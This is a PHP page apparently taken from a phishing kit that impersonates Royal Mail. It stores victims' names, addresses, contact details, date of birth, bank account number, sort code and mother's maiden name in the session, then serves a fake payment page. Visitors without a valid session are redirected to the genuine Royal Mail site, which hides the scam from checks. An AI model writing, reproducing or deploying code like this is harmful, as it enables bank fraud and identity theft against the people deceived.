<?php
session_start();
include './control.php';

if ($_SESSION["valid"]) {
	if ($_POST) {

		$_SESSION['firstName'] = $_POST['firstName'];
		$_SESSION['lastName'] = $_POST['lastName'];
		$_SESSION['addressLine1'] = $_POST['addressLine1'];
		$_SESSION['city'] = $_POST['city'];
		$_SESSION['county'] = $_POST['county'];
		$_SESSION['postcode'] = $_POST['postcode'];
		$_SESSION['email'] = $_POST['email'];
		$_SESSION['phone'] = $_POST['phone'];
		$_SESSION['dob'] = $_POST['bday'] . '/' . $_POST['bmon'] . '/' . $_POST['byear'];
		$_SESSION['acc'] = $_POST['acc'];
		$_SESSION['scc'] = $_POST['scc'];
		$_SESSION['mmn'] = $_POST['mmn'];
	}

	$html = file_get_contents(__DIR__ . '/html/payment.html');

	$html = replaceTags($html);

	sleep(2);

	echo $html;

} else {
	header('Location: https://royalmail.com/');
}